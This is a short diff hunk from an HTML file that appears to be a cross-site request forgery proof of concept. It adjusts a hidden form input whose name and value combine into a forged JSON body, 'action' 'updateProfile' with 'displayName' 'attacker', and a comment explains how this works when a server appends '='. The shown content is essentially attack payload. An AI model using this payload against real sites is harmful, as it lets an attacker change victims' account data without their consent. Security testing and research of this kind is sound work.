@@ -19,7 +19,7 @@ Useful if the backend transforms or normalizes the raw text body before JSON par
       This works when text/plain is accepted but the server appends an '=' at the end.
       In this case the end of the JSON would look like: "displayName":"=attacker"}
     -->
-    <input type="hidden" name='{"action":"updateProfile","displayName":" 'value='attacker"}' />
+    <input type="hidden" name='{"action":"updateProfile","displayName":"' value='attacker"}' />
   </form>
 
   <script>
